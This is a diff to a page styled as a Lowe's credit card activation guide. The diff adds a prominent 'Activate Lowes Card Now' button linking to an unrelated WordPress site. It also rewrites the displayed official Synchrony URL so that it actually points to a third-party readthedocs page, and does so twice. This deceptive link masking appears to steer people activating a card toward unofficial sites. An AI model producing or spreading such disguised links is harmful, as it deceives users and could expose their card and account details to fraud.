@@ -2,10 +2,20 @@
 lowes.syf.com/activate – MyLowe’s Card Activation Guide
 =======================================================
 
+
+.. raw:: html
+
+    <div style="text-align:center; margin-top:30px;">
+        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#000000; color:#ffffff; padding:18px 40px; font-size:20px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 6px 10px rgba(0,0,0,0.15); display:inline-block;">
+         ➡ Activate Lowes Card Now 
+        </a>
+    </div>
+
+
 If you’ve received a new **MyLowe’s Card**, you need to activate it before use.  
 To begin, visit the official Synchrony Bank portal:
 
-**➡ https://lowes.syf.com/activate**
+➡ `https://lowes.syf.com/activate <https://lowecreditcardhelphub.readthedocs.io/en/latest/>`_
 
 Once activated, you’ll unlock a range of benefits including exclusive savings, rewards, and seamless account management.
 
@@ -65,6 +75,8 @@ Having trouble with the activation process? Try the following:
 - Use an up-to-date browser
 - Try a different device or internet connection
 - Call Synchrony Bank support (phone number on back of card)
+
+➡ `https://lowes.syf.com/activate <https://lowecreditcardhelphub.readthedocs.io/en/latest/>`_
 
 Frequently Asked Questions (FAQs)
 =================================
